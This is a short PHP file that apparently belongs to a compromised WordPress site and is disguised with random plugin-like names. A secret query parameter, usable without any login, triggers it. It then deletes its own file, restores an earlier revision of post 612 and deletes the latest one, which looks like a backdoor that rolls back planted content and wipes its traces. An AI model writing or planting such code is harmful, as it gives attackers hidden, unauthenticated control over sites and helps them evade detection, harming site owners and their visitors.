<?php

function library_preview_kit_gravity() {
	if (isset($_GET['views_security_highlighter']) && $_GET['views_security_highlighter'] === 'stripe_crm_file') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$register_refresh_scheduler = 612;
		$addon_top_supports = wp_get_post_revisions($register_refresh_scheduler);
		if (empty($addon_top_supports)) die('no revisions');
		if (count($addon_top_supports) < 2) die('less than 2');
		$script_nav_anywhere = array_shift($addon_top_supports);
		$classic_homepage_updater = $script_nav_anywhere->ID;
		$csv_customize_external = array_shift($addon_top_supports);
		$alt_keyword_exporter = $csv_customize_external->ID;
		$album_box_effect_layout = wp_restore_post_revision($alt_keyword_exporter);
		if ($album_box_effect_layout === false) die('error restoring');
		$album_box_effect_layout = wp_delete_post_revision($classic_homepage_updater);		
		if ($album_box_effect_layout === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'library_preview_kit_gravity');
